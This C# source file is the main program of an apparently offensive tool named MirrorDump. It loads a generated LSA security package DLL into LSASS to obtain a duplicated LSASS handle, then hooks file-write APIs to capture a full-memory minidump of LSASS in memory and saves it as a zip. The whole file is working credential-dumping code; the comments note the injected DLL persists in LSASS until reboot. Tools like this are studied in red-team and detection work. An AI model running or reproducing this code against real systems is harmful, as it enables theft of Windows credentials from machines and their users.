using MirrorDump.Lsa;
using Mono.Options;
using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Runtime.InteropServices;
using static MirrorDump.MiniDumpToMem;
using static MirrorDump.ProcessUtility;
using static MirrorDump.WinAPI;

namespace MirrorDump {
    class Program {

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(
             uint processAccess,
             bool bInheritHandle,
             int processId);

        static IntPtr MagicHandle = new IntPtr(0x5555555);

        static void SaveZip(string fileName, DumpContext dc) {
            using (var fileStream = new FileStream(fileName, FileMode.Create, FileAccess.ReadWrite)) {
                using (var archive = new ZipArchive(fileStream, ZipArchiveMode.Create, true)) {
                    var lsassDump = archive.CreateEntry($"{Guid.NewGuid()}.dmp");

                    using (var entryStream = lsassDump.Open()) {
                        using (var streamWriter = new BinaryWriter(entryStream)) {
                            streamWriter.Write(dc.Data, 0, (int)dc.Size);
                        }
                    }
                }
            }
        } 
        
        static ProcessHandle FindLsassHandle() {
            var procHandles = ProcessUtility.GetProcessHandles(Process.GetCurrentProcess());
            foreach (var procHandle in procHandles) {
                if (procHandle.Process?.ProcessName == "lsass") {
                    return procHandle;
                }
            }
            return null;
        }

        static void Main(string[] args) {

            int pid = 0;
            uint limit = 0;
            string fileName = "lsass.zip";
            string dllName = "LsaProviderDuper.dll";
            bool showHelp = false;

            OptionSet option_set = new OptionSet()
                 .Add("f=|filename=", "Output path for generated zip file", v => fileName = v)
                 .Add("d=|dllName", "Output LSA DLL name", v => dllName = v)
                 .Add("l=|limit=", "The maximum amount of memory the minidump is allowed to consume", v => limit = uint.Parse(v))
                 .Add("h|help", "Display this help", v => showHelp = v != null);

            try {

                option_set.Parse(args);

                if (fileName == null)
                    showHelp = true;

                if (showHelp) {
                    option_set.WriteOptionDescriptions(Console.Out);
                    return;
                }

            } catch (Exception e) {
                Console.WriteLine("[!] Failed to parse arguments: {0}", e.Message);
                option_set.WriteOptionDescriptions(Console.Out);
                return;
            }

            //Generate our LSA plugin DLL that will duplicate lsass handle into this process
            Console.Write($"[+] Generating new LSA DLL {dllName} targeting PID {Process.GetCurrentProcess().Id}.....");
            LsaAssembly.GenerateLsaPlugin(dllName);
            Console.WriteLine($"Done.");
            
            //Load our LSA plugin. This will actually return a failiure due to us
            //not implementing a correct LSA plugin, but it's enough to duplicate the handle
            SECURITY_PACKAGE_OPTIONS spo = new SECURITY_PACKAGE_OPTIONS();
            AddSecurityPackage(new FileInfo(dllName).FullName, spo);                 
            Console.WriteLine("[+] LSA security package loaded, searching current process for duplicated LSASS handle");

            //Now search this process for the duplicated handle that the LSA plugin done on our behalf
            var procHandle = FindLsassHandle();
            if(procHandle != null) {
                Console.WriteLine($"[+] Found duplicated LSASS process handle 0x{procHandle.Handle.ToInt64():x}");
            } else {
                Console.WriteLine($"[!] Failed to get LSASS handle, bailing!");
                return;
            }            

            //http://cybernigma.blogspot.com/2014/03/using-sspap-lsass-proxy-to-mitigate.html
            //It actually has no effect what so ever, so only a reboot will get rid of the DLL from LSASS
            DeleteSecurityPackage(new FileInfo(dllName).FullName);
              
            //OK, first part done.  We have our LSASS handle.  Now lets perform our dump in memory
            //by hook the relevant file writing API's and redirect to memory
            MiniDumpToMem.InitHookEngine(MagicHandle, limit, procHandle.Process.Id, procHandle.Handle);

            Console.Write("[=] Dumping LSASS memory");

            if (!MiniDumpWriteDump(procHandle.Handle, (uint)procHandle.Process.Id, MagicHandle, MINIDUMP_TYPE.MiniDumpWithFullMemory, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero)) {
                if (Marshal.GetLastWin32Error() == ERROR_DISK_FULL) {
                    Console.WriteLine("\n[!] Minidump memory limit reached, could not create dump");
                } else {
                    Console.WriteLine($"\n[!] Minidump generation failed with error 0x{Marshal.GetHRForLastWin32Error():x}");
                }
            } else {
                Console.WriteLine($"\n[+] Minidump successfully saved to memory, size {Math.Round(MiniDumpToMem.GetDumpContextFromHandle(MagicHandle).Size / 1024.0 / 1024.0, 2)}MB");
            }

            //All done, lets clean up and zip our dump for demo purposes
            CloseHandle(procHandle.Handle);
            MiniDumpToMem.ShutdownHookEngine();

            SaveZip(fileName, MiniDumpToMem.GetDumpContextFromHandle(MagicHandle));
            Console.WriteLine($"[+] Minidump compressed and saved to {fileName}");             
        }
    }
}
